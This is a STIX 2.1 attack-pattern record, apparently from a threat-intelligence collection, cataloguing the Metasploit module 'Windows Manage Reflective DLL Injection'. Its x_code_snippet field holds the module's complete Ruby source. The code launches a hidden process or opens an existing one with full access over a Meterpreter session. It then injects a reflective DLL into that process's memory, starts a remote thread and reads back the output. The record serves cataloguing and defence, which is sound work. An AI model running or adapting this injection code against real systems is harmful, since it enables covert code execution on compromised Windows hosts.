{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e61781a2-ecd2-482f-b55a-61fd8e48e795",
    "created": "2024-08-14T16:33:04.972782Z",
    "modified": "2024-08-14T16:33:04.972786Z",
    "name": "Windows Manage Reflective DLL Injection Module",
    "description": " This module will inject a specified reflective DLL into the memory of a process, new or existing. If arguments are specified, they are passed to the DllMain entry point as the lpvReserved (3rd) parameter. To read output from the injected process, set PID to zero and WAIT to non-zero. Make sure the architecture of the DLL matches the target process.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/reflective_dll_inject.rb",
            "external_id": "reflective_dll_inject.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/stephenfewer/ReflectiveDLLInjection"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Reflective DLL Injection Module',\n        'Description' => %q{\n          This module will inject a specified reflective DLL into the memory of a\n          process, new or existing. If arguments are specified, they are passed to\n          the DllMain entry point as the lpvReserved (3rd) parameter. To read\n          output from the injected process, set PID to zero and WAIT to non-zero.\n          Make sure the architecture of the DLL matches the target process.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Ben Campbell', 'b4rtik'],\n        'Platform' => 'win',\n        'SessionTypes' => ['meterpreter'],\n        'References' => [\n          [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_attach\n              stdapi_sys_process_execute\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_getpid\n              stdapi_sys_process_kill\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_write\n              stdapi_sys_process_thread_create\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptPath.new('PATH', [true, 'Reflective DLL to inject into memory of a process']),\n        OptInt.new('PID', [false, 'Pid to inject', 0]),\n        OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe']),\n        OptString.new('ARGUMENTS', [false, 'Command line arguments']),\n        OptInt.new('WAIT', [false, 'Time in seconds to wait before reading output', 0])\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('KILL', [ true, 'Kill the injected process at the end of the task', false ])\n      ]\n    )\n  end\n\n  def run\n    dll_path = ::File.expand_path(datastore['PATH'])\n    if File.file?(dll_path)\n      run_dll(dll_path)\n    else\n      print_bad(\"Dll not found #{dll_path}\")\n    end\n  end\n\n  def pid_exists(pid)\n    mypid = client.sys.process.getpid.to_i\n\n    if pid == mypid\n      print_bad('Can not select the current process as the injection target')\n      return false\n    end\n\n    host_processes = client.sys.process.get_processes\n    if host_processes.empty?\n      print_bad('No running processes found on the target host.')\n      return false\n    end\n\n    theprocess = host_processes.find { |x| x['pid'] == pid }\n\n    !theprocess.nil?\n  end\n\n  def launch_process\n    process_name = datastore['PROCESS']\n    process_name << '.exe' unless process_name.end_with?('.exe')\n\n    print_status(\"Launching #{process_name} ...\")\n    channelized = datastore['WAIT'] != 0\n\n    process = client.sys.process.execute(\n      process_name,\n      nil,\n      'Channelized' => channelized,\n      'Hidden' => true\n    )\n\n    hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)\n    print_good(\"Process #{hprocess.pid} created.\")\n    [process, hprocess]\n  end\n\n  def inject_dll(process, dll_path)\n    library_path = ::File.expand_path(dll_path)\n    exploit_mem, offset = inject_dll_into_process(process, library_path)\n    [exploit_mem, offset]\n  end\n\n  def open_process\n    pid = datastore['PID'].to_i\n\n    if pid_exists(pid)\n      print_status(\"Opening handle to process #{datastore['PID']}...\")\n      hprocess = client.sys.process.open(datastore['PID'], PROCESS_ALL_ACCESS)\n      print_good('Handle opened')\n      [nil, hprocess]\n    else\n      print_bad('Pid not found')\n      [nil, nil]\n    end\n  end\n\n  def run_dll(dll_path)\n    print_status(\"Running module against #{sysinfo['Computer']}\") unless sysinfo.nil?\n    if (datastore['PID'] > 0) || (datastore['WAIT'] == 0)\n      print_warning('Output unavailable')\n    end\n\n    if datastore['PID'] <= 0\n      process, hprocess = launch_process\n    else\n      process, hprocess = open_process\n    end\n\n    if hprocess.nil?\n      print_bad('Execution finished')\n      return\n    end\n\n    exploit_mem, offset = inject_dll(hprocess, dll_path)\n\n    if datastore['ARGUMENTS'].nil?\n      arg_mem = nil\n    else\n      arg_mem = copy_args(hprocess)\n    end\n\n    print_status('Executing...')\n    hprocess.thread.create(exploit_mem + offset, arg_mem)\n\n    if datastore['WAIT'] != 0\n      sleep(datastore['WAIT'])\n    end\n\n    if (datastore['PID'] <= 0) && (datastore['WAIT'] != 0)\n      read_output(process)\n    end\n\n    if datastore['KILL']\n      print_good(\"Killing process #{hprocess.pid}\")\n      client.sys.process.kill(hprocess.pid)\n    end\n\n    print_good('Execution finished.')\n  end\n\n  def copy_args(process)\n    argssize = datastore['ARGUMENTS'].size + 1\n    arg_mem = process.memory.allocate(argssize, PAGE_READWRITE)\n    params = datastore['ARGUMENTS']\n    params += \"\\x00\"\n\n    process.memory.write(arg_mem, params)\n    arg_mem\n  end\n\n  def read_output(process)\n    print_status('Start reading output')\n    old_timeout = client.response_timeout\n    client.response_timeout = 5\n\n    begin\n      loop do\n        output = process.channel.read\n        if !output.nil? && !output.empty?\n          output.split(\"\\n\").each { |x| print_good(x) }\n        end\n        break if output.nil? || output.empty?\n      end\n    rescue Rex::TimeoutError => e\n      vprint_warning('Time out exception: wait limit exceeded (5 sec)')\n    rescue ::Exception => e\n      print_error(\"Exception: #{e.inspect}\")\n    end\n\n    client.response_timeout = old_timeout\n    print_status('End output.')\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}